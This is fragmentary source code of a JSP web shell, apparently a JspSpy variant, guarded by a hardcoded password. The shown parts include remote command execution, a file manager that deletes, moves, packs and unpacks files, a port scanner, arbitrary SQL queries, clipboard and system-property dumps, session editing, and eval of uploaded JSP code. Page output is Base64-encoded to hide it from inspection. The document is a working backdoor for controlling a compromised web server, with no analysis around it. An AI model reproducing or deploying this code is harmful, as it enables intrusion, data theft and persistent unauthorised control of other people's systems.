...
<script src="http://127.0.0.1:8080/base64.min.js"></script>
<script>
    var str = "<%=new BASE64Encoder().encode(OUT1.toString().getBytes()).replace("\n","") %>";

    var encodeStr = Base64.decode(str);
    document.writeln(encodeStr);
</script>


<%!
    private static final String PW = "Mr.chou"; //password
    private static final StringBuilder OUT1 = new StringBuilder();
    ...
    private static class Util{
        ...
        public static void outMsg(Writer out,String msg,String align) throws Exception {
            OUT1.append("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:"+align+";font-weight:bold;margin:10px\">"+msg+"</div>");
        }
...
<%
    ...
    if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {
        ...
        if (o != null &&  o.equals("login")) {
           ...
           //  response.getWriter().write(OUT1.toString());
             return;
...
<%!
    ...
    private static class ScriptInvoker extends DefaultInvoker{
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<script type=\"text/javascript\">"+
    ...
    private static class BeforeInvoker extends  DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                PrintWriter out = response.getWriter();
                Appendstr("<html><head><title></title><style type=\"text/css\">"+
    ...
    private static class ClipBoardInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                PrintWriter out = response.getWriter();
                Appendstr("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
                        "  <tr>"+
                        "    <td>"+
                        "        <h2>System Clipboard &raquo;</h2>"+
                        "<p><pre>");
                try{
                    Appendstr(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getContents(DataFlavor.stringFlavor).getTransferData(DataFlavor.stringFlavor))));
                }catch (Exception ex) {
                    Appendstr("ClipBoard is Empty Or Is Not Text Data !");
                }
                Appendstr("</pre>"+
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                if (Util.isEmpty(timeout))
                    timeout = "2";
                Appendstr("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
    ...
    private static class PortScanInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<div style='margin:10px'>");
                ...
                while (it.hasNext()) {
                    ...
                    Appendstr(ip+" : "+port+" ................................. <font color="+(value.equals("Close")?"red":"green")+"><b>"+value+"</b></font><br>");
                }
                Appendstr("</div>");
            } catch (Exception e) {
    ...
    private static class DbcInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<form action=\""+SHELL_NAME+"\" method=\"POST\">"+
                ...
                if (Util.isEmpty(sql)) {
                    ...
                    if (Util.isEmpty(type) || type.equals("switch")) {
                        ...
                        Appendstr(Table.rs2Table(t,"",false));
                        t.close();
                    }
                }
            } catch (Exception e) {
                ...
                if (!Util.isEmpty(sql)) {
                    if (dbo == null || !((DBOperator)dbo).isValid()) {
                        ...
                        if (obj instanceof ResultSet) {
                            ...
                            Appendstr("<b style=\"margin-left:15px\">Query#0 : "+Util.htmlEncode(sql)+"</b><br/><br/>");
                            Appendstr("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\" style=\"margin-left:15px\"><tr class=\"head\">");
                            for (int i=1;i<=colCount;i++) {
                                Appendstr("<td nowrap>"+meta.getColumnName(i)+"<br><span>"+meta.getColumnTypeName(i)+"</span></td>");
                            }
                            Appendstr("</tr>");
                            Table tb = new Table();
                            while(rs.next()) {
                            ...
                            Appendstr(tb.toString());
                            Appendstr("</table><br/>");
                            rs.close();
                            ((DBOperator)dbo).closeStmt();
                        } else {
                            Appendstr("<b style='margin-left:15px'>affected rows : <i>"+obj+"</i></b><br/><br/>");
                        }
                    }
                } else {
                    ((Invoker)ins.get("dbc")).invoke(request,response,JSession);
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<html><head><title></title><style type=\"text/css\">"+
                        ...
                        "<!--<p style=\"font:11px Verdana;color:red\"></p>-->"+
    ...
    private static class FileListInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception {
            try {
                ...
                Appendstr("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total (unknow)</h2>");
                Appendstr("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
                        ...
                        "</table>"+
                        "</form>");
                Appendstr("<table width=\"98%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">"+
                ...
                for (int i = 0;i<roots.length;i++) {
                    File r = roots[i];
                    Appendstr("<a href=\"javascript:new fso({path:'"+Util.convertPath(r.getPath())+"'}).subdir('true');\">Disk("+Util.convertPath(r.getPath())+")</a>");
                    if (i != roots.length -1) {
                        Appendstr("|");
                    }
                }
                ...
                for (int i = 0;i<list.length;i++) {
                    ...
                    if (f.isDirectory()) {
                        dircount ++;
                        Appendstr("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt2';\">"+
                        ...
                        if (enter != null)
                            ...
                            Appendstr("<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack(true)\">Pack</a>");
                        Appendstr("</td></tr>");
                    } else {
                        filecount++;
                        Appendstr("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">"+
                        ...
                        if (enter == null ) {
                            Appendstr(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | "+
                            ...
                            if (f.getName().endsWith(".zip") || f.getName().endsWith(".jar")) {
                                Appendstr(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).unpack()\">UnPack</a>");
                            } else if (f.getName().endsWith(".rar")) {
                                Appendstr(" | <a href=\"javascript:alert('Dont Support RAR,Please Use WINRAR');\">UnPack</a>");
                            } else {
                                Appendstr(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a>");
                            }
                        }
                        Appendstr("</td></tr>");
                    }
                }
                Appendstr("<tr class=\"alt2\"><td align=\"center\">&nbsp;</td>"+
                        "  <td>");
                if (enter != null)
                    Appendstr("<a href=\"javascript:alert('You Are In File Now ! Can Not Pack !');\">Pack Selected</a> - <a href=\"javascript:alert('You Are In File Now ! Can Not Delete !');\">Delete Selected</a>");
                else
                    Appendstr("<a href=\"javascript:new fso({}).packBatch();\">Pack Selected</a> - <a href=\"javascript:new fso({}).deleteBatch();\">Delete Selected</a>");
                Appendstr("</td>"+
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
                        ...
                        "<p>");
                if (enter != null)
                    Appendstr("<input class=\"bt\" name=\"submit\" id=\"submit\" onclick=\"alert('You Are In File Now ! Can Not Save !')\" type=\"button\" value=\"Submit\">");
                else
                    Appendstr("<input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\">");
                Appendstr("<input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"></p>"+
                        "</form>"+
                        "</td></tr></table>");
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                if (type.equals("command")) {
                    ...
                    Appendstr("<div style='margin:10px'><hr/>");
                    Appendstr("<pre>");
                    ...
                    if (!Util.isEmpty(command)) {
                        ...
                        String s = reader.readLine();
                        while (s != null) {
                            Appendstr(Util.htmlEncode(Util.getStr(s))+"<br />");
                            s = reader.readLine();
                        }
                        reader.close();
                        ...
                        s = reader.readLine();
                        while (s != null) {
                            Appendstr(Util.htmlEncode(Util.getStr(s)));
                            s = reader.readLine();
                        }
                        reader.close();
                        Appendstr("</pre></div>");
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                while (names.hasMoreElements()){
                    ...
                    Appendstr("<li><u>"+Util.htmlEncode(name)+" : </u>"+Util.htmlEncode(pro.getProperty(name))+"</li>");
                }
                Appendstr("</ul><h2 id=\"Ninty_H2_Mac\">System Environment &gt;&gt;</h2><hr/><ul id=\"Ninty_Ul_Sys\" class=\"info\">");
					/*
					Map envs = System.getenv();
					Set<Map.Entry<String,String>> entrySet = envs.entrySet();
					for (Map.Entry<String,String> en:entrySet) {
						Appendstr("<li><u>"+Util.htmlEncode(en.getKey())+" : </u>"+Util.htmlEncode(en.getValue())+"</li>");
					}*/
                Appendstr("</ul></div></td>"+
                        "      </tr>"+
                        "    </table>");
    ...
    private static class ReflectInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<form action=\""+SHELL_NAME+"\" id='refForm' method=\"post\">"+
    ...
    private static class TopInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                PrintWriter out = response.getWriter();
                Appendstr("<form action=\""+SHELL_NAME+"\" method=\"post\" name=\"doForm\"></form>"+
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                Appendstr("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
                        "  <tr>"+
                        "    <td>");
                Appendstr("<h2>Shell OnLine &raquo;</h2><br/>");
                Appendstr("<form action=\""+SHELL_NAME+"\" method=\"post\" target=\"echo\" onsubmit=\"$('cmd').focus()\">"+
    ...
    private static class VExport2FileInvoker extends DefaultInvoker {
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            ...
            Appendstr("<form action=\"\" method=\"post\">"+
                    "<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
                    "  <tr>"+
                    "    <td>"+
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            ...
            if (Util.isEmpty(type)) {
                ...
                Util.outMsg(out,"<pre>"+
                        ...
                        "}\r\n"+
                        "</pre>","left");
                Appendstr(" <input class=\"input\" name=\"file\" type=\"file\"/> <input type=\"submit\" class=\"bt\" value=\" Eval \"></form><hr/>"+
                        ...
                        "      <textarea name=\"jspc\" rows=\"15\" cols=\"70\">"+URLDecoder.decode("%3C%25%40page+pageEncoding%3D%22utf-8%22%25%3E%0D%0A%3C%25%0D%0A%2F%2Fyour+code+here.%0D%0AAppendstr%28%22create+a+jsp+file+then+include+it+%21+by++ninty%22%29%3B%0D%0A%25%3E","utf-8")+"</textarea>"+
                ...
                Appendstr("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:left;font-weight:bold;margin:10px\">");
                request.getRequestDispatcher("evaltmpninty.jsp").include(request,response);
                Appendstr("</div><input type=\"button\" value=\" Back \" class=\"bt\" onclick=\"history.back()\"></td></tr></table> ");
                f.delete();
            }
        }
    }
            ...
            try {
                ...
                while (en.hasMoreElements()) {
                    ...
                    if (o.toString().equals(MSG))
                        continue;
                    Appendstr("<li><form action='"+SHELL_NAME+"' method='post'><u>"+o.toString()+"</u> <input type=\"text\" name=\"value\" class=\"input\" size=\"50\" value=\""+JSession.getAttribute(o.toString())+"\">");
                    Appendstr("<input type='button' class='bt' value='Update' onclick=\"this.form.elements['type'].value='update';this.form.submit()\"> <input type='button' onclick=\"this.form.elements['type'].value='delete';this.form.submit()\" class='bt' value='Delete'/>");
                    Appendstr("<input type='hidden' name='o' value='sm'/><input type='hidden' name='type'/>");
                    Appendstr("<input type='hidden' name='name' value='"+o.toString()+"'/>");
                    Appendstr("</form></li>");
                }
                Appendstr("<li style='list-style:none'><form action='"+SHELL_NAME+"' method='post'><fieldset>"+
